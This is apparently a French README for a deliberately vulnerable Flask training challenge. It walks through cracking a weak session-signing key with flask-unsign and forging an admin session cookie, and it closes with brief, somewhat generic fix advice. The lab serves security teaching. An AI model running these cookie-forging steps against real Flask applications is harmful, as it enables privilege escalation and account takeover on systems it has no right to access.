# Flask Session

## Prérequis

### Environnement Python

- **Python 3.x** : [Télécharger Python](https://www.python.org/downloads/)
- **Flask** : Framework web léger pour Python

### Installation des Dépendances

1. **Créer un environnement virtuel** (optionnel mais recommandé) :

    ```bash
    python3 -m venv venv
    source venv/bin/activate  # Sur Windows : venv\Scripts\activate
    ```

2. **Installer Flask** :

    ```bash
    pip install Flask
    ```

## Démarrage du Projet

1. **Clonez ce dépôt** sur votre machine :

    ```bash
    git clone https://github.com/votre-utilisateur/repo-nom.git
    cd repo-nom
    ```

2. **Lancez le serveur Flask** :

    ```bash
    python main.py
    ```

3. **Accédez à l'application** via votre navigateur à l'adresse suivante : `http://127.0.0.1:5000/`.

## Structure du Projet

### Routes Disponibles

- **Route `/`** : Page d'accueil qui affiche un message en fonction du rôle de l'utilisateur.

### But du challenge

Ce connecter sur / en tant qu'admin par defaut vous serez avec le username test.

### Exploitation de la Faille et Correction

Voici comment vous pouvez exploiter cette faille :

1. **Connectez-vous** à `/`.

2. Récupéré le token de session
    - Ouvrez les outils de développement de votre navigateur (`F12` sur Chrome/Firefox).
    - Allez dans l'onglet **Application** (ou **Storage**).
    - Sous la section **Cookies**, trouvez le cookie `session`.

3. installer **flask-unsign** :

    ```bash
    pip install flask-unsign flask-unsign[wordlist]
    ```

4. trouver **la clé** qui sert à chiffrer les tokens de session:

    ```bash
    flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6InRlc3QifQ.Zrtyug.azCH0EatqpPnsr7648NZJLhhzok'
    ```

5. une fois la clé obtenu: **supersecretkey**, créer un nouveau token admin

    ```bash
    flask-unsign --sign --cookie "{'username': 'admin'}" --secret 'supersecretkey'
    ```

6. utilisé le nouveau token dans votre session flask
    - Ouvrez les outils de développement de votre navigateur (`F12` sur Chrome/Firefox).
    - Allez dans l'onglet **Application** (ou **Storage**).
    - Sous la section **Cookies**, trouvez le cookie `session`.
    - Changez la valeur avec le nouveau cookie.

## Corriger la Faille

### Solution 1 : Validation des Données d'Entrée

Il est important de ne jamais faire confiance aux données provenant des requêtes utilisateur. Vous devez valider et nettoyer toute donnée avant de l'utiliser pour modifier l'état de la session.

### Solution 2 : Utilisation de Jetons de Session Sécurisés

Une approche sécurisée consiste à utiliser des jetons de session qui ne peuvent pas être modifiés par l'utilisateur et qui sont gérés de manière sécurisée côté serveur.